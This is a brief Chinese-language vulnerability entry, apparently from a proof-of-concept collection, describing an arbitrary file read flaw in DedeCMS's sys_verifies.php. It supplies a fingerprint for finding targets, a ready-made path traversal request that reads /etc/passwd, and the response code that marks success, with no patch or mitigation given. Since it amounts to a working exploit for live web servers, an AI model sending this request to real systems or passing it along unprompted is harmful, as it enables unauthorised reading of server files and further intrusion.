# Dedecms接口sys_verifies.php存在任意文件读取漏洞

Dedecms ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app=”dedecms”`
- **请求**：`http://ip/dede/sys_verifies.php?action=view&filename=../../../../../etc/passwd`
- **响应特征**：200